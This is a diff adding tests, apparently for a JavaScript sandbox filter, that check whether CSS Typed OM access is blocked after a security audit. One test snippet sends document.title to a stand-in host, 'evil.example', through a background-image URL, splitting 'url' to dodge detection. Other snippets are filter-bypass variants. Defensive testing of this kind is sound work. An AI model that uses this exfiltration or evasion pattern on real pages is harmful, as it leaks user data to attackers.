@@ -1331,3 +1331,27 @@ describe('second audit (#48): getSVGDocument', () => {
     expect(blocks(`document.querySelector('div').getAttribute('data-x')`)).toBe(false)
   })
 })
+
+describe('second audit (#48): Typed OM', () => {
+  const SNIPPETS = [
+    `document.body.attributeStyleMap.set('background-image', 'ur'+'l(https://evil.example/?' + document.title + ')')`,
+  ]
+  for (const snippet of SNIPPETS) {
+    it(`blocks: ${snippet}`, () => {
+      expect(blocks(snippet)).toBe(true)
+    })
+  }
+
+  it('blocks variants, and still passes the style object', () => {
+    for (const source of [
+      `document.body.styleMap.set('background-image', 'x')`,
+      `document.body['attributeStyleMap'].set('background-image', 'x')`,
+      `const { attributeStyleMap } = document.body`,
+      `new CSSStyleValue()`,
+    ]) {
+      expect(blocks(source), source).toBe(true)
+    }
+    expect(blocks(`document.body.style.display = 'none'`)).toBe(false)
+    expect(blocks(`getComputedStyle(document.body).getPropertyValue('color')`)).toBe(false)
+  })
+})
